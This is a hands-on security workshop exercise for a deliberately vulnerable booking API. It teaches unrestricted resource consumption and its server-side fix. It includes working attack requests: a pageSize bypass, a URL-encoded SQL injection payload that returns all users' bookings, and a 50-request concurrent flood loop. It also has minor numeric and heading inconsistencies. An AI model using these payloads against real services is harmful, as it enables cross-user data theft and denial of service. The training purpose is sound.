# Exercise 05 — Uncontrolled Resource Consumption: Booking Search

**Difficulty:** Beginner  
**Category:** Uncontrolled Resource Consumption  
**OWASP Top 10:** A05:2021 — Security Misconfiguration / API4:2023 — Unrestricted Resource Consumption  
**Config flag:** `BookingDojo:Workshop:BookingSearchResourceConsumption`

---

## Scenario

The booking search endpoint (`GET /api/bookings/search?q=&pageSize=N`) accepts a caller-supplied `pageSize` and honours it without any server-side cap. An attacker can omit `pageSize` entirely (returns every row) or set it to `999999` to retrieve the full table in a single request. Combined with Lab 03's SQL injection, the same request can return **all bookings for all users** with no limit — loading arbitrarily large result sets into server memory.

---

## Background

**Uncontrolled resource consumption** occurs when an API does not enforce limits on the resources a single request can consume. Common forms include:

- No maximum page size — one request returns millions of rows
- No execution timeout — slow queries hold connections indefinitely
- No rate limiting — any user can send unlimited requests per second
- No request size limit — uploading arbitrarily large payloads

This vulnerability is distinct from SQL injection. Even with a perfectly parameterised query, returning 100 000 rows per request is a DoS risk. Both vulnerabilities exist independently on this endpoint; the workshop toggles them separately.

---

## Setup

```bash
docker compose up -d
dotnet run --project src/BookingDojo.Api -- --seed-and-exit
dotnet run --project src/BookingDojo.Api &
dotnet run --project src/BookingDojo.Bff &
cd src/bookingdojo-ui && npm run dev &
```

In `src/BookingDojo.Api/appsettings.json`, confirm both flags are Vulnerable:

```json
"Workshop": {
  "BookingSearchSqlInjection": "Vulnerable",
  "BookingSearchResourceConsumption": "Vulnerable"
}
```

---

## Step 1 — Observe normal UI behaviour

The database is pre-seeded with 212 bookings for `partner`.

```bash
# Log in as partner
curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Partner1234!"}' | jq .
```

Open the Bookings page and click **Search** (leave the hotel field blank). You see 10 results with a "showing first 10 results" badge. That looks safe — but inspect the outgoing request:

```bash
# This is exactly what the UI sends
curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=&pageSize=10" \
  | jq '{count: (.results | length), truncated}'
```

Expected: `{ "count": 10, "truncated": true }` — only 10 returned because the client asked for 10 and the server honoured it. The limit lives entirely in the JavaScript, not on the server.

---

## Step 2 — Bypass the client-side limit

The `pageSize=10` is just a number in the query string. Any HTTP client can change it:

```bash
# Attacker bypasses the UI and asks for 500
time curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=&pageSize=100" \
  | jq '{count: (.results | length), truncated}'
```

Expected: `{ "count": 212, "truncated": false }` — all 212 bookings returned.

```bash
# Or omit pageSize entirely — no cap applied at all
time curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=" \
  | jq '{count: (.results | length), truncated}'
```

Expected: `{ "count": 212, "truncated": false }` — same result.

Measure the response size:

```bash
curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=&pageSize=100" | wc -c
```

With 212 bookings the response is roughly 60–100 KB. Scale this to 100 000 bookings and a single bypassed request returns tens of megabytes.

---

## Step 3 — Combine with SQL injection for maximum impact

With `BookingSearchSqlInjection: Vulnerable`, a single request returns **all bookings from all users** with no limit:

```bash
# SQL injection payload — bypasses the UserId filter
time curl -s -b cookies.txt \
  "http://localhost:5001/bff/bookings/search?q=%25%27%20OR%20%271%27%3D%271%27%20--" \
  | jq '{count: (.results | length), truncated}'
```

Without the resource cap, this returns every booking in the entire system — all users' card data, all dates, everything — in one response.

---

## Step 3 — Flood with concurrent requests

Even with only the caller's own bookings, concurrent requests exhaust server resources:

```bash
# 50 concurrent search requests
for i in $(seq 1 50); do
  curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=" > /dev/null &
done
wait
echo "Done"
```

Each request allocates memory for all 200+ booking objects. 50 concurrent requests × 200 objects × ~1 KB each = ~10 MB of live allocations simultaneously — plus the garbage collector pressure, thread pool saturation, and connection pool exhaustion.

Monitor memory during the flood:

```bash
ps aux | grep BookingDojo.Api | awk '{print $6 " KB RSS"}'
```

---

## Step 4 — Apply the fix

In `appsettings.json`:

```json
"BookingSearchResourceConsumption": "Fixed"
```

Restart the API and repeat both calls — with and without a large `pageSize`:

```bash
# No pageSize — still capped at 10
curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=" \
  | jq '{count: (.results | length), truncated}'

# Caller requests 999999 rows — server ignores it, returns 10
curl -s -b cookies.txt "http://localhost:5001/bff/bookings/search?q=&pageSize=999999" \
  | jq '{count: (.results | length), truncated}'
```

Both return:

```json
{ "count": 10, "truncated": true }
```

The UI shows **"— capped at 10 results (server-side limit)"** next to the result count. The server ignores whatever the client sends in `pageSize` and enforces its own hard cap.

The fixed code:

```csharp
// WORKSHOP: FIXED PATH — client-supplied pageSize is intentionally ignored
const int MaxResults = 10;
if (results.Count > MaxResults)
{
    results = results.Take(MaxResults).ToList();
    truncated = true;
}
```

### How it works at runtime

```
GET /api/bookings/search?q=&pageSize=999999
        │
        ▼
SearchBookings(pageSize = 999999)
        │
        ├─ Vulnerable: honours caller-supplied pageSize
        │       │
        │       ▼
        │  DB query fetches all 210 matching rows into memory
        │       │
        │       └─► if pageSize=999999: all 210 rows returned
        │           if pageSize omitted: all 210 rows returned
        │           server memory/CPU proportional to row count
        │
        └─ Fixed: server-side cap, caller-supplied pageSize ignored
                │
                ▼
           DB query fetches all rows, then:
           results.Take(10) → at most 10 returned
                │
                └─► { results: [...10 items...], truncated: true }
```

---

## Step 5 — Discussion

| Control | Description | Applied here |
|---------|-------------|--------------|
| Result page size cap | Hard limit on records per response | ✓ (10 results) |
| Pagination | Client requests pages with offset/limit | Next step |
| Rate limiting | Max N requests per user per second | Middleware (not yet) |
| Query timeout | Kill queries running longer than N seconds | DB/EF Core timeout |
| Request body size limit | Reject oversized POST bodies | ASP.NET default (30 MB) |

**Why a hard cap and not just pagination?**

This lab demonstrates exactly this: in Vulnerable mode the `pageSize` parameter exists but the server honours whatever the caller sends. Setting `pageSize=999999` is indistinguishable from not having pagination at all. The fix must be a server-side hard limit that the client **cannot negotiate around** — the server decides the cap, the caller's `pageSize` is discarded.

**Independent toggles**

Notice that `BookingSearchSqlInjection` and `BookingSearchResourceConsumption` are separate flags. You can have:

| SQLi flag | Resource flag | Effect |
|-----------|--------------|--------|
| Vulnerable | Vulnerable | Injection returns unlimited results for all users |
| Fixed | Vulnerable | Safe query but still returns unlimited caller results |
| Vulnerable | Fixed | Injection capped at 10 — less devastating but still leaks cross-user data |
| Fixed | Fixed | Both vulnerabilities addressed |

These are separate code paths with separate root causes — and separate fixes.

---

## Key Takeaways

- **Fixing injection is not the same as fixing resource abuse.** A perfectly parameterised query with no row limit is still a DoS vector.
- **Client-controlled limits are not limits.** Any pagination `pageSize` the server honours without a hard cap can be set to `Integer.MAX_VALUE`.
- **Concurrent requests multiply the impact.** 50 users × unlimited results = unbounded memory regardless of per-user quotas.
- **The fix is a single server-side constant.** `Take(50)` costs one line of code; the absence of it can take down the server.

---

## Further Reading

- [OWASP API4:2023 — Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [OWASP A05:2021 — Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [ASP.NET Core Rate Limiting middleware](https://learn.microsoft.com/en-us/aspnet/core/performance/rate-limit)
